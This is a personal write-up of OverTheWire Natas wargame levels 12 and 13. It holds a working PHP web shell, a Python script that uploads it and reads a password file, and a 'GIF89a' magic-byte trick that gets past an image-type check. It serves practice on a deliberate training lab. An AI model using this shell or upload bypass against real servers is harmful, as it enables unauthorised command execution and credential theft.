
2024-07-14 18:54

Source:   #natas #web #py 

Tags: [[Local File Inclusion & Command Injection]]
## Natas12

we have a unrestricted file upload functionality 

create a [[php]] file named `revshell.php` with the following contents, we will modify the `c` parameter later 
```
<?php
	system($_GET['c']);
?>
```

```
import requests
username = 'natas12'
password = 'yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB'

url = 'http://natas12.natas.labs.overthewire.org/'
sessions = requests.Session()

#response = sessions.post(url,files = {"uploadedfile" : open('revshell.php','rb')},data = {"filename": "revshell.php"},auth = (username,password))

response = sessions.get(url + 'upload/kx42yjw6zv.php?c=cat /etc/natas_webpass/natas13',auth = (username,password))

print(response.text)
```
1. commented code uploads our created `php` file  using `.post` method  
2. the output of the commented code will reveal the newly created file name on the server of the file that we uploaded 
3. in our case the path is `upload/kx42yjw6zv.php`
4. we append the path to the `url` and try executing commands by adding our commands to the previously defined `c` parameter.
## Natas13

similar to natas12, here we have a `php` module named `exif_imagetype` that [[image upload]]checks if the file uploaded is an image and within the size limit of 1kb 

`exif_imagetype` checks for file signatures

we add `GIF89a` at the start of our payload `php` file making the contents of the file as 
```
GIF89a
<?php
system($_GET['c']);
?>
```

rest of the process is same as natas12

### References
https://www.youtube.com/watch?v=fqwxYowJA0c